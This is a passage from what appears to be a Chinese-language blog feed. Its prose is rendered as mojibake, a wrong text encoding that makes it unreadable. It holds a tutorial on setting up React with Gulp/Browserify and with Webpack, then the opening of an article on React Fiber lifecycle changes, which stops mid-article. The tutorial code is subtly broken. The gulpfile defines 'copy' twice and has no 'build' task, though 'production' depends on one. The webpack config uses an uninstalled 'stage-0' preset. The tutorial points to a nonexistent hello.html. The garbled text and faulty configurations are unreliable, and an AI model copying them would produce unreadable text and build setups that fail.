è‹¥æ˜¯é›»è…¦ä¸­å°šæœªå®‰è£ Nodeï¼ˆNode.js æ˜¯ä¸€å€‹é–‹æ”¾åŸå§‹ç¢¼ã€è·¨å¹³å°çš„ã€å¯ç”¨æ–¼ä¼ºæœå™¨ç«¯å’Œç¶²è·¯æ‡‰ç”¨çš„ Google V8 å¼•æ“åŸ·è¡ŒåŸ·è¡Œç’°å¢ƒï¼‰å’Œ NPMï¼ˆNode å¥—ä»¶ç®¡ç†å™¨ Node Package Managerã€‚æ˜¯ä¸€å€‹ä»¥ JavaScript ç·¨å¯«çš„è»Ÿé«”å¥—ä»¶ç®¡ç†ç³»çµ±ï¼Œé è¨­ç’°å¢ƒç‚º Node.jsï¼Œå¾ Node.js 0.6.3 ç‰ˆæœ¬é–‹å§‹ï¼Œnpm è¢«è‡ªå‹•é™„å¸¶åœ¨å®‰è£åŒ…ä¸­ï¼‰çš„è©±ï¼Œè«‹å…ˆ ä¸Šå®˜ç¶²å®‰è£

ç”¨ npm å®‰è£ browserify

ç”¨ npm å®‰è£ gulpã€gulp-concatã€gulp-html-replaceã€gulp-streamifyã€gulp-uglifyã€watchifyã€vinyl-source-stream é–‹ç™¼ç’°å¢ƒç”¨çš„å¥—ä»¶ï¼ˆdevelopment dependenciesï¼‰
 // ä½¿ç”¨ npm install --save-dev æœƒå°‡å®‰è£çš„å¥—ä»¶åç¨±å’Œç‰ˆæœ¬å­˜æ”¾åˆ° package.json çš„ devDependencies æ¬„ä½ä¸­$ npm install --save-dev gulp gulp-concat gulp-html-replace gulp-streamify gulp-uglify watchify vinyl-source-stream  

å®‰è£ babelifyã€babel-preset-es2015ã€babel-preset-reactï¼Œè½‰è­¯ ES6 å’Œ JSX é–‹ç™¼ç’°å¢ƒç”¨çš„å¥—ä»¶ï¼Œä¸¦æ–¼æ ¹ç›®éŒ„åº•ä¸‹è¨­å®š .babelrcï¼Œè¨­å®šè½‰è­¯è¦å‰‡ï¼ˆpresetsï¼šes2015ã€reactï¼‰å’Œä½¿ç”¨çš„å¤–æ›
 // ä½¿ç”¨ npm install --save-dev æœƒå°‡å®‰è£çš„å¥—ä»¶åç¨±å’Œç‰ˆæœ¬å­˜æ”¾åˆ° package.json çš„ devDependencies æ¬„ä½ä¸­$ npm install --save-dev babelify babel-preset-es2015 babel-preset-react

 .babelrc&#123;	&quot;presets&quot;: [	  &quot;es2015&quot;,	  &quot;react&quot;,	],	&quot;plugins&quot;: []&#125;

å®‰è£ react å’Œ react-dom
 $ npm install --save react react-dom

æ’°å¯« Component
 ./app/index.jsimport React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;class App extends React.Component &#123;  constructor(props) &#123;    super(props);    this.state = &#123;    &#125;;  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;h1&gt;Hello, World!&lt;/h1&gt;      &lt;/div&gt;    );  &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;app&#x27;));

 ./index.html&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;	&lt;meta charset=&quot;UTF-8&quot;&gt;	&lt;title&gt;Hello React!&lt;/title&gt;&lt;/head&gt;&lt;body&gt;	&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;	&lt;!-- build:js --&gt;	&lt;script src=&quot;./dist/src/bundle.js&quot;&gt;&lt;/script&gt;	&lt;!-- endbuild --&gt;&lt;/body&gt;&lt;/html&gt;

è¨­å®š gulpfile.js
 gulpfile.js// å¼•å…¥æ‰€æœ‰éœ€è¦çš„æª”æ¡ˆconst gulp = require(&#x27;gulp&#x27;);const uglify = require(&#x27;gulp-uglify&#x27;);const htmlreplace = require(&#x27;gulp-html-replace&#x27;);const source = require(&#x27;vinyl-source-stream&#x27;);const browserify = require(&#x27;browserify&#x27;);const watchify = require(&#x27;watchify&#x27;);const babel = require(&#x27;babelify&#x27;);const streamify = require(&#x27;gulp-streamify&#x27;);// æª”æ¡ˆä½ç½®åƒæ•¸const path = &#123;  HTML: &#x27;index.html&#x27;,  MINIFIED_OUT: &#x27;bundle.min.js&#x27;,  OUT: &#x27;bundle.js&#x27;,  DEST: &#x27;dist&#x27;,  DEST_BUILD: &#x27;dist/build&#x27;,  DEST_SRC: &#x27;dist/src&#x27;,  ENTRY_POINT: &#x27;./app/index.js&#x27;&#125;;// è¤‡è£½ html åˆ° dist è³‡æ–™å¤¾ä¸­gulp.task(&#x27;copy&#x27;, function()&#123;  gulp.src(path.HTML)    .pipe(gulp.dest(path.DEST));&#125;);// ç›£è½æª”æ¡ˆæ˜¯å¦æœ‰è®ŠåŒ–ï¼Œè‹¥æœ‰è®ŠåŒ–å‰‡é‡æ–°ç·¨è­¯ä¸€æ¬¡gulp.task(&#x27;watch&#x27;, function() &#123;  gulp.watch(path.HTML, [&#x27;copy&#x27;]);var watcher  = watchify(browserify(&#123;    entries: [path.ENTRY_POINT],    transform: [babel],    debug: true,  &#125;));return watcher.on(&#x27;update&#x27;, function () &#123;    watcher.bundle()      .pipe(source(path.OUT))      .pipe(gulp.dest(path.DEST_SRC))      console.log(&#x27;Updated&#x27;);  &#125;)    .bundle()    .pipe(source(path.OUT))    .pipe(gulp.dest(path.DEST_SRC));&#125;);// åŸ·è¡Œ build production çš„æµç¨‹ï¼ˆåŒ…æ‹¬ uglifyã€è½‰è­¯ç­‰ï¼‰gulp.task(&#x27;copy&#x27;, function()&#123;  browserify(&#123;    entries: [path.ENTRY_POINT],    transform: [babel],  &#125;)    .bundle()    .pipe(source(path.MINIFIED_OUT))    .pipe(streamify(uglify(path.MINIFIED_OUT)))    .pipe(gulp.dest(path.DEST_BUILD));&#125;);// å°‡ script å¼•ç”¨æ›æˆ production çš„æª”æ¡ˆgulp.task(&#x27;replaceHTML&#x27;, function()&#123;  gulp.src(path.HTML)    .pipe(htmlreplace(&#123;      &#x27;js&#x27;: &#x27;build/&#x27; + path.MINIFIED_OUT    &#125;))    .pipe(gulp.dest(path.DEST));&#125;);// è¨­å®š NODE_ENV ç‚º productiongulp.task(&#x27;apply-prod-environment&#x27;, function() &#123;    process.env.NODE_ENV = &#x27;production&#x27;;&#125;);// è‹¥ç›´æ¥åŸ·è¡Œ gulp æœƒåŸ·è¡Œ gulp default çš„ä»»å‹™ï¼šwatchã€copyã€‚è‹¥è·‘ gulp productionï¼Œå‰‡æœƒåŸ·è¡Œ buildã€replaceHTMLã€apply-prod-environmentgulp.task(&#x27;production&#x27;, [&#x27;build&#x27;, &#x27;replaceHTML&#x27;, &#x27;apply-prod-environment&#x27;]);gulp.task(&#x27;default&#x27;, [&#x27;watch&#x27;, &#x27;copy&#x27;]);

æˆæœå±•ç¤º åˆ°ç›®å‰ç‚ºæ­¢æˆ‘å€‘çš„è³‡æ–™å¤¾çš„çµæ§‹æ‡‰è©²æœƒæ˜¯é€™æ¨£ï¼š
 
 æ¥ä¸‹ä¾†æˆ‘å€‘é€éåœ¨çµ‚ç«¯æ©Ÿï¼ˆterminalï¼‰ä¸‹ gulp æŒ‡ä»¤ä¾†è™•ç†æˆ‘å€‘è¨­å®šå¥½çš„ä»»å‹™ï¼š
 // ç•¶åªæœ‰è¼¸å…¥ gulp æ²’æœ‰è¼¸å…¥ä»»å‹™åç¨±æ™‚ï¼Œgulp æœƒè‡ªå‹•åŸ·è¡Œ default çš„ä»»å‹™ï¼Œæˆ‘å€‘é€™é‚ŠæœƒåŸ·è¡Œ `watch` å’Œ `copy` çš„ä»»å‹™ï¼Œå‰è€…æœƒç›£è½ `./app/index.js` æ˜¯å¦æœ‰æ”¹è®Šï¼Œæœ‰çš„è©±å‰‡æ›´æ–°ã€‚å¾Œè€…å‰‡æ˜¯æœƒæŠŠ `index.html` è¤‡è£½åˆ° `./dist/index.html`$ gulp

 ç•¶åŸ·è¡Œå®Œ gulp å¾Œï¼Œæˆ‘å€‘å¯ä»¥ç™¼ç¾å¤šäº†ä¸€å€‹ dist è³‡æ–™å¤¾
 
 å¦‚æœæˆ‘å€‘æ˜¯è¦é€²è¡Œ production çš„æ‡‰ç”¨ç¨‹å¼é–‹ç™¼çš„è©±ï¼Œæˆ‘å€‘å¯ä»¥åŸ·è¡Œï¼š 
 // ç•¶è¼¸å…¥ gulp production æ™‚ï¼Œgulp æœƒåŸ·è¡Œ production çš„ä»»å‹™ï¼Œæˆ‘å€‘é€™é‚ŠæœƒåŸ·è¡Œ `replaceHTML`ã€`build` å’Œ `apply-prod-environment` çš„ä»»å‹™ï¼Œ`build` ä»»å‹™æœƒé€²è¡Œè½‰è­¯å’Œ `uglify`ã€‚`replaceHTML` æœƒå–ä»£ `index.html` è¨»è§£ä¸­çš„ `&lt;script&gt;` å¼•å…¥æª”æ¡ˆï¼Œè®Šæˆå¼•å…¥å£“ç¸®å’Œ `uglify` å¾Œçš„ `./dist/build/bundle.min.js`ã€‚`apply-prod-environment` å‰‡æ˜¯æœƒæ›´æ”¹ `NODE_ENV` è®Šæ•¸ï¼Œè®“ç’°å¢ƒè¨­å®šæ”¹ç‚º `production`ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å¯ä»¥åƒè€ƒ[React å®˜ç¶²èªªæ˜](https://facebook.github.io/react/downloads.html)$ gulp production

 æ­¤æ™‚æˆ‘å€‘å¯ä»¥åœ¨ç€è¦½å™¨ä¸Šæ‰“é–‹æˆ‘å€‘çš„ ./dist/hello.htmlï¼Œå°±å¯ä»¥çœ‹åˆ° Hello, world! äº†ï¼


Webpack
Webpack æ˜¯ä¸€å€‹æ¨¡çµ„æ‰“åŒ…å·¥å…·ï¼ˆmodule bundlerï¼‰ï¼Œä»¥ä¸‹åˆ—å‡º Webpack çš„å¹¾é …ä¸»è¦åŠŸèƒ½ï¼š

å°‡ CSSã€åœ–ç‰‡èˆ‡å…¶ä»–è³‡æºæ‰“åŒ…
æ‰“åŒ…ä¹‹å‰é è™•ç†ï¼ˆLessã€CoffeeScriptã€JSXã€ES6 ç­‰ï¼‰çš„æª”æ¡ˆ
ä¾ entry æ–‡ä»¶ä¸åŒï¼ŒæŠŠ .js åˆ†æ‹†ç‚ºå¤šå€‹ .js æª”æ¡ˆ
æ•´åˆè±å¯Œçš„ loader å¯ä»¥ä½¿ç”¨

æ¥ä¸‹ä¾†æˆ‘å€‘ä¸€æ¨£é€é Hello World å¯¦ä¾‹ä¾†ä»‹ç´¹å¦‚ä½•ç”¨ Webpack è¨­ç½® React é–‹ç™¼ç’°å¢ƒï¼š

å®‰è£ Node å’Œ NPM

å®‰è£ Webpackï¼ˆå¯ä»¥ global æˆ– local project å®‰è£ï¼‰ã€webpack loaderã€webpack-dev-server
 Webpack ä¸­çš„ loader é¡ä¼¼æ–¼ browserify å…§çš„ transformsï¼Œä½† Webpack åœ¨ä½¿ç”¨ä¸Šæ¯”è¼ƒå¤šå…ƒï¼Œé™¤äº† JavaScript loader å¤–ä¹Ÿæœ‰ CSS Style å’Œåœ–ç‰‡çš„ loaderã€‚æ­¤å¤–ï¼Œwebpack-dev-server å‰‡å¯ä»¥å•Ÿå‹•é–‹ç™¼ç”¨ server æ–¹ä¾¿ä½¿ç”¨
 $ npm install --save-dev babel-core babel-eslint babel-loader babel-preset-es2015 babel-preset-react html-webpack-plugin webpack webpack-dev-server

è¨­å®š webpack.config.js äº‹å¯¦ä¸Šï¼Œwebpack.config.js æœ‰é»é¡ä¼¼æ–¼å‰è¿°çš„ gulpfile.js åŠŸç”¨ï¼Œä¸»è¦æ˜¯è¨­å®š webpack çš„ç›¸é—œè¨­å®š
 ./webpack.config.js// é€™é‚Šä½¿ç”¨ HtmlWebpackPluginï¼Œå°‡ bundle å¥½å¾— &lt;script&gt; æ’å…¥åˆ° body  const HtmlWebpackPlugin = require(&#x27;html-webpack-plugin&#x27;);const HTMLWebpackPluginConfig = new HtmlWebpackPlugin(&#123;  template: `$&#123;__dirname&#125;/app/index.html`,  filename: &#x27;index.html&#x27;,  inject: &#x27;body&#x27;,&#125;);// æª”æ¡ˆèµ·å§‹é»å¾ entry é€²å…¥ï¼Œä¹Ÿå¯ä»¥æ˜¯å¤šå€‹æª”æ¡ˆã€‚output æ˜¯æ”¾å…¥ç”¢ç”Ÿå‡ºä¾†çš„çµæœçš„ç›¸é—œåƒæ•¸ã€‚loaders å‰‡æ˜¯æ”¾æ¬²ä½¿ç”¨çš„ loadersï¼Œåœ¨é€™é‚Šæ˜¯ä½¿ç”¨ babel-loader å°‡æ‰€æœ‰ .jsï¼ˆé€™é‚Šç”¨åˆ°æ­£å‰‡å¼ï¼‰ç›¸é—œæª”æ¡ˆè½‰è­¯æˆç€è¦½å™¨å¯ä»¥é–±è®€çš„ JavaScriptã€‚devServer å‰‡æ˜¯ webpack-dev-server è¨­å®šã€‚plugins æ”¾ç½®æ‰€ä½¿ç”¨çš„å¤–æ›module.exports = &#123;  entry: [    &#x27;./app/index.js&#x27;,  ],  output: &#123;    path: `$&#123;__dirname&#125;/dist`,    filename: &#x27;index_bundle.js&#x27;,  &#125;,  module: &#123;    loaders: [      &#123;        test: /\.js$/,        exclude: /node_modules/,        loader: &#x27;babel-loader&#x27;,        query: &#123;          presets: [&#x27;es2015&#x27;, &#x27;react&#x27;, &#x27;stage-0&#x27;],        &#125;,      &#125;,    ],  &#125;,  devServer: &#123;    inline: true,    port: 8008,  &#125;,  plugins: [HTMLWebpackPluginConfig],&#125;;

è¨­å®š .babelrc
 .babelrc&#123;  &quot;presets&quot;: [    &quot;es2015&quot;,    &quot;react&quot;,  ],  &quot;plugins&quot;: []&#125;

å®‰è£ react å’Œ react-dom
 $ npm install --save react react-dom

æ’°å¯« Component
 ./app/index.html&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;	&lt;meta charset=&quot;UTF-8&quot;&gt;	&lt;title&gt;React Setup&lt;/title&gt;	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css&quot;&gt;&lt;/head&gt;&lt;body&gt;	&lt;div id=&quot;app&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;

 ./app/index.jsimport React from &#x27;react&#x27;;import ReactDOM from &#x27;react-dom&#x27;;class App extends React.Component &#123;  constructor(props) &#123;    super(props);    this.state = &#123;    &#125;;  &#125;  render() &#123;    return (      &lt;div&gt;        &lt;h1&gt;Hello, World!&lt;/h1&gt;      &lt;/div&gt;    );  &#125;&#125;ReactDOM.render(&lt;App /&gt;, document.getElementById(&#x27;app&#x27;));

åœ¨çµ‚ç«¯æ©Ÿä½¿ç”¨ webpackï¼Œæˆæœå±•ç¤º



webpackï¼šæœƒåœ¨é–‹ç™¼æ¨¡å¼ä¸‹é–‹å§‹ä¸€æ¬¡æ€§çš„å»ºç½®
webpack -pï¼šæœƒå»ºç½® production çš„ç¨‹å¼ç¢¼ 
webpack â€“watchï¼šæœƒç›£è½ç¨‹å¼ç¢¼çš„ä¿®æ”¹ï¼Œç•¶å„²å­˜æ™‚æœ‰ç•°å‹•æ™‚æœƒæ›´æ–°æª”æ¡ˆ
webpack -dï¼šåŠ å…¥ source maps æª”æ¡ˆ
webpack â€“progress â€“colorsï¼šåŠ ä¸Šè™•ç†é€²åº¦èˆ‡é¡è‰²

å¦‚æœä¸æƒ³æ¯æ¬¡éƒ½æ‰“ä¸€é•·ä¸²çš„æŒ‡ä»¤ç¢¼çš„è©±å¯ä»¥ä½¿ç”¨ package.json ä¸­çš„ scripts è¨­å®š
.package.json&quot;scripts&quot;: &#123;  &quot;dev&quot;: &quot;webpack-dev-server --devtool eval --progress --colors --content-base build&quot;&#125;

ç„¶å¾Œåœ¨çµ‚ç«¯æ©ŸåŸ·è¡Œï¼š
$ npm run dev

ç•¶æˆ‘å€‘æ­¤æ™‚æˆ‘å€‘å¯ä»¥æ‰“é–‹ç€è¦½å™¨è¼¸å…¥ http://localhost:8008 ï¼Œå°±å¯ä»¥çœ‹åˆ° Hello, world! äº†ï¼
ç¸½çµä»¥ä¸Šå°±æ˜¯ React é–‹ç™¼ç’°å¢ƒçš„ä¸‰ç¨®ä¸»è¦æ–¹å¼ï¼šCDN-basedã€browserify å’Œ webpackã€‚ä¸€èˆ¬ä¾†èªªåœ¨é–‹ç™¼å¤§å‹æ‡‰ç”¨ç¨‹å¼ï¼Œä½¿ç”¨ React + Gulp + Browserify æˆ–ç”¨ React æ­é… Webpack éƒ½æ˜¯åˆé©çš„ä½œæ³•ï¼Œä¸»è¦æ˜¯ä¾æ“šåœ˜éšŠé–‹ç™¼çš„ç¿’æ…£å’Œç´„å®šã€‚ä¸éï¼Œè‹¥ä½ ä¸æƒ³åœ¨ç’°å¢ƒè¨­å®šä¸ŠèŠ±å¤ªå¤šæ™‚é–“çš„è©±ï¼Œä¸å¦¨åƒè€ƒ Facebook é–‹ç™¼ç¤¾ç¾¤æ¨å‡ºçš„ create-react-appï¼Œå¯ä»¥å¿«é€Ÿä¸Šæ‰‹ï¼Œä½¿ç”¨ Webpackã€Babelã€ESLint é–‹ç™¼ React æ‡‰ç”¨ç¨‹å¼ï¼
å»¶ä¼¸é–±è®€
JavaScript æ¨¡å—åŒ–ä¸ƒæ—¥è°ˆ
å‰ç«¯æ¨¡å—åŒ–å¼€å‘é‚£ç‚¹å†å²
JavaScript Modules: A Beginnerâ€™s Guide
æ·±å…¥äº†è§£ Webpack Plugins
Babel å…¥é—¨æ•™ç¨‹
WEBPACKå…¥é–€æ•™å­¸ç­†è¨˜
Setting up React for ES6 with Webpack and Babel
ã€webpackã€‘çš„åŸºæœ¬å·¥ä½œæµç¨‹
æˆ‘çš„REACTå¼€å‘ä¹‹è·¯1:REACTçš„ç¯å¢ƒæ­å»º
åˆ©ç”¨browserifyå’Œgulpæ¥æ„å»ºreactåº”ç”¨
gulp å­¸ç¿’ç­†è¨˜
Webpack vs Browserify - whatâ€™s best for React?
Browserify vs Webpack
Setting up environment for React, SASS, ES2015, Babel with Webpack
Javascript Tutorial: How to set up Gulp for Developing ES2015 React v0.14+ Applications with Babelify &amp; Browserify
React.js Tutorial Pt 2: Building React Applications with Gulp and Browserify.
Building modular javascript applications in ES6 with React, Webpack and Babel
Make your own React production version with webpack
How to set React to production mode when using Gulp
Browserify ä½¿ç”¨æŒ‡å—
ä½¿ç”¨ Webpack å»ºç«‹ React å°ˆæ¡ˆé–‹ç™¼ç’°å¢ƒ
å¦‚ä½•ä½¿ç”¨ Webpack æ¨¡çµ„æ•´åˆå·¥å…·
åƒé€ webpack
WEBPACK DEV SERVER
Understanding ES6 Modules

(image via srinisoundarã€sitepointã€keyholesoftwareã€survivejs)
é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ï¼Œç›®å‰å°ˆæ³¨åœ¨ Mobile å’Œ IoT æ‡‰ç”¨é–‹ç™¼ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>React, React Native, ES5, ES6, ES7, JavaScript, ECMAScript2015, Webpack, Browserify, CommonJS, UMD, ES6 Module, CMD</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·ºè«‡ React Fiber åŠå…¶å° lifecycles é€ æˆçš„å½±éŸ¿</title>
    <url>/2018/03/31/react-fiber-and-lifecycle-change/</url>
    <content><![CDATA[å‰è¨€é›–ç„¶èªªå¾ä»¥å‰å°±ä¸€ç›´è½åˆ° React è¦æŠŠå…§éƒ¨çš„ reconciler æ›æˆä¸€å€‹å«åš Fiber çš„æ±è¥¿ï¼Œä½†å¾æ²’ä»”ç´°ç ”ç©¶éï¼Œä¹Ÿä¸çŸ¥é“é€™æ¨£å­çš„æ”¹è®Šæœƒå°ä¸Šå±¤é€ æˆä»€éº¼å½±éŸ¿ã€‚
çœŸæ­£é–‹å§‹æ¯”è¼ƒæ·±å…¥ç†è§£ï¼Œæ˜¯åœ¨æŸä¸€æ¬¡ä½¿ç”¨ Redux Form æ™‚è¸©åˆ°ä¸€å€‹ç›¸é—œçš„ bugï¼Œæ‰çŸ¥é“ React è‡ªå¾æ­£å¼æ”¹ç”¨ Fiber ä¹‹å¾Œï¼Œå…¶å¯¦å°ä¸Šå±¤ä¹Ÿæœ‰ä¸€äº›æ”¹è®Šã€‚
é€™ç¯‡çš„æ¨™é¡Œã€Œæ·ºè«‡ã€ä¸æ˜¯é¨™ä½ çš„ï¼Œé€™ç¯‡çœŸçš„å¾ˆæ·ºï¼Œæˆ‘ä¸æœƒè«‡åˆ° Fiber åº•å±¤çš„é‹ä½œï¼ˆå› ç‚ºæˆ‘ä¹Ÿé‚„æ²’èªçœŸç ”ç©¶éï¼‰ï¼Œåªæœƒç”¨ç™½è©±æ–‡è·Ÿä½ èªª Fiber å¤§æ¦‚æ˜¯æ€æ¨£ï¼Œæ˜¯ç‚ºäº†è§£æ±ºä»€éº¼æ¨£å­çš„å•é¡Œè€Œèª•ç”Ÿã€‚
è¬é‡Œä¹‹è¡Œï¼Œå§‹æ–¼ Bugæ¯ä¸€æ¬¡èƒ½è¸©åˆ° Bug çš„æ©Ÿæœƒï¼Œæˆ‘éƒ½æœƒå¥½å¥½æŠŠæ¡ã€‚
ç‚ºä»€éº¼ï¼Ÿå› ç‚ºé€™æ˜¯ä¸€æ¬¡å¼·è¿«ä½ å­¸ç¿’çš„æ©Ÿæœƒã€‚Bug è§£ä¸æ‰ï¼Œä½ å°±æ²’è¾¦æ³•ç¹¼çºŒä¸‹å»ï¼Œæ‰€ä»¥ç‚ºäº†è¦è§£æ±º Bugï¼Œä½ å¿…é ˆå»æ¢ç©¶åŸå› ï¼Œå¿…é ˆçŸ¥é“é€™å€‹å•é¡Œç‚ºä»€éº¼ç”¢ç”Ÿï¼Œä»¥åŠæ‡‰è©²è¦æ€éº¼è§£æ±ºã€‚
ç•¶ç„¶ï¼Œä½ ä¹Ÿå¯ä»¥ç›´æ¥å¾ Stack Overflow æ‰¾ç­”æ¡ˆç„¶å¾Œè¤‡è£½è²¼ä¸Šï¼Œè¦†è“‹é€™å¼µç‰ŒçµæŸé€™å›åˆã€‚å¯æ˜¯å·¥ä½œä¹…äº†ä½ æœƒç™¼ç¾ï¼Œä¸æ˜¯æ‰€æœ‰å•é¡Œéƒ½å¯ä»¥å¾é‚£ä¸Šé¢æ‰¾åˆ°è§£ç­”ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘ä¸€å¹´å‰å¯«çš„æˆ‘é‡éçš„æœ€é›£çš„ Cookie å•é¡Œå°æˆ‘ä¾†èªªå°±æ˜¯ä¸€å€‹å¾ˆå¥½çš„å­¸ç¿’æ©Ÿæœƒã€‚
å¥½ï¼Œé‚£é€™æ¬¡æˆ‘åˆæ˜¯é‡åˆ°ä»€éº¼ Bug å‘¢ï¼Ÿ
æˆ‘å€‘å…¬å¸çš„ç”¢å“æœ‰ç”¨åˆ°redux-formï¼Œè€Œå•é¡Œæ˜¯é€™æ¨£çš„ï¼Œæˆ‘æœ‰å…©å€‹é é¢ï¼Œéƒ½ç”¨äº†åŒä¸€å€‹ componentï¼Œå«åšFormBlockå¥½äº†ã€‚
æˆ‘å…ˆå» A é é¢ï¼Œå†å» B é é¢ï¼Œå†å›ä¾† A é é¢ï¼Œæˆ‘çš„ redux-form çš„ validation å°±å¤±æ•ˆäº†ï¼Œåœ¨è¡¨å–® submit çš„æ™‚å€™ä¸¦ä¸æœƒåŸ·è¡Œ validationã€‚
é‚£æ™‚å€™æœåˆ°äº†å¹¾å€‹ç›¸é—œçš„ issueï¼Œä½†é‚„æ˜¯æƒ³è‡ªå·±æŸ¥å€‹æ¸…æ¥šï¼Œå°±è·‘å»æ‰¾äº† redux-form çš„åŸå§‹ç¢¼ï¼Œç ”ç©¶äº†å¹¾å€‹å°æ™‚çµ‚æ–¼æ‰¾åˆ°å‡ºå•é¡Œçš„åœ°æ–¹ã€‚
åœ¨ redux-form åŸ·è¡Œ validation çš„æ™‚å€™ï¼Œæœƒå…ˆæª¢æŸ¥ fields æ˜¯ä¸æ˜¯æœ‰è¢«è¨»å†Šéï¼Œå¦‚æœæ²’è¢«è¨»å†Šçš„è©±ï¼Œå°±ç›´æ¥å›å‚³trueï¼Œä¸æœƒé€²è¡Œä»»ä½•é©—è­‰ï¼Œæˆ‘è‡ªå·±åŠ äº†å¹¾å€‹ console.log ä¹‹å¾Œï¼Œç™¼ç¾å•é¡Œå°±æ˜¯å‡ºåœ¨é€™é‚Šï¼Œfield æ²’æœ‰è¢«è¨»å†Šåˆ°ã€‚
æ¥è‘—å°±ä¾†æ‰¾ä¸€ä¸‹æ˜¯åœ¨å“ªé‚Šè¨»å†Šçš„ï¼Œç™¼ç¾åœ¨componentWillMountçš„æ™‚å€™ï¼Œæœƒ dispatch ä¸€å€‹ action ä¾†è¨»å†Šæ‰€æœ‰çš„è¡¨å–®æ¬„ä½ï¼ˆREGISTER_FIELDï¼‰ã€‚
ç„¶å¾Œåœ¨componentWillUnmountçš„æ™‚å€™ï¼Œredux-form æœƒ dispatch ä¸€å€‹ action å«åšDESTROYï¼ˆç›¸é—œç¨‹å¼ç¢¼ï¼‰ï¼ŒæŠŠæ‰€æœ‰è¨»å†Šçš„ field çµ¦æ¸…æ‰ã€‚
åˆ°ç›®å‰ç‚ºæ­¢ï¼Œä¸€åˆ‡çœ‹ä¼¼éƒ½å¾ˆåˆç†ã€‚æˆ‘åœ¨é›¢é–‹ B é é¢çš„æ™‚å€™ï¼Œè§¸ç™¼FormBlockçš„componentWillUnmountï¼Œå–æ¶ˆè¨»å†Šæ‰€æœ‰çš„ fieldï¼Œåœ¨é€²å…¥ A é é¢æ™‚ï¼Œè§¸ç™¼FormBlockçš„componentWillMountï¼ŒæŠŠæ‰€æœ‰çš„ field é‡æ–°è¨»å†Šå›ä¾†ã€‚
å¯æ˜¯å¦‚æœä½ æ‰“é–‹ redux-devtoolï¼Œæœƒç™¼ç¾é †åºè·Ÿä½ æƒ³åƒä¸­ä¸å¤ªä¸€æ¨£ï¼š

å’¦ï¼Ÿæ€éº¼æœƒå…ˆè¨»å†Šå†åˆªé™¤ï¼Ÿè€Œä¸”å› ç‚ºåˆªé™¤äº†ï¼Œæ‰€ä»¥é©—è­‰å°±å¤±æ•ˆäº†ï¼Œä¸æœƒåŸ·è¡Œä»»ä½•é©—è­‰çš„é‚è¼¯ã€‚
å†ä»”ç´°æ‰¾äº†ä¸€ä¸‹ç›¸é—œçš„è³‡æ–™ï¼Œçœ‹åˆ°é€™ç¯‡ Browser back button not working with react-router@4.0.0-beta.7 and react@16-alpha.4 Issue ä»¥åŠ Redux ä»¥åŠ React çš„é–‹ç™¼è€… gaearon åœ¨ä¸‹é¢çš„å›ç­”ï¼š

In React 15, if A is replaced by B, we unmount A, and then create and mount B:



A.componentWillUnmount
B.constructor
B.componentWillMount
B.componentDidMount



In Fiber, we create B first, and only later unmount A and mount B:



B.constructor
B.componentWillMount
A.componentWillUnmount
B.componentDidMount


åœ¨ React 16 ä»¥å¾Œï¼Œç”±æ–¼é€™æ¨£å­çš„é †åºæ”¹è®Šï¼Œå°è‡´äº†ä¸Šé¢ redux-form çš„ lifecycle åŸ·è¡Œé †åºè·Ÿé æœŸä¸­ä¸ç¬¦ï¼Œä¹Ÿé–“æ¥å°è‡´äº†æˆ‘é–‹é ­æ‰€èªªçš„é‚£å€‹ Bugã€‚
åˆ°äº†é€™é‚Šï¼Œå•é¡Œç”¢ç”Ÿçš„åŸå› ä¸€è·¯å¾ redux-form æœ¬èº«è¿½åˆ°äº† Reactï¼Œåˆæ›´ç´°ç¯€çš„è¿½åˆ°äº† Fiberï¼Œçœ‹ä¾†ï¼Œæ²’è¾¦æ³•å†ç¹¼çºŒé€ƒé¿ Fiber äº†ã€‚
å…ˆä¸€ä½µå¥‰ä¸Šè·Ÿ redux-form ä»¥åŠåŸ·è¡Œé †åºç›¸é—œçš„å…¶ä»–åƒè€ƒè³‡æ–™ï¼Œå†è®“æˆ‘å€‘å¥½å¥½çœ‹çœ‹ Fiberã€‚

Re-mounting a Field component erases the field-level validation function
Ordering of componentWillMount&#x2F;Unmount in React 16
Asynchronous ComponentWillUnmount in React 16

Fiber åˆ°åº•æ˜¯ä»€éº¼ï¼Ÿè¦ç­è§£ä¸€å€‹æ–°çš„æ±è¥¿ï¼Œæœ€å¿«çš„æ–¹å¼å°±æ˜¯å›ç­”ä»¥ä¸‹å•é¡Œï¼š

å®ƒæ˜¯æ‹¿ä¾†è§£æ±ºä»€éº¼å•é¡Œçš„ï¼Ÿ
è§£æ±ºæ–¹æ³•æ˜¯ä»€éº¼ï¼Ÿ

åªè¦èƒ½äº†è§£é€™å…©å€‹å•é¡Œï¼Œå°±èƒ½å°é€™å€‹æ–°çš„æ±è¥¿æœ‰åˆæ­¥çš„æ¦‚å¿µï¼Œå„˜ç®¡ä½ é‚„æ˜¯ä¸çŸ¥é“å¯¦ä½œç´°ç¯€ï¼Œä½†è‡³å°‘ä½ çŸ¥é“å®ƒå¸¶ä¾†çš„å½±éŸ¿åŠæ”¹è®Šæ˜¯ä»€éº¼ã€‚
æˆ‘å€‘å…ˆä¾†çœ‹ä¸€ä¸‹ä¸€ç›´å­˜åœ¨æ–¼ React çš„ä¸€å€‹å•é¡Œã€‚
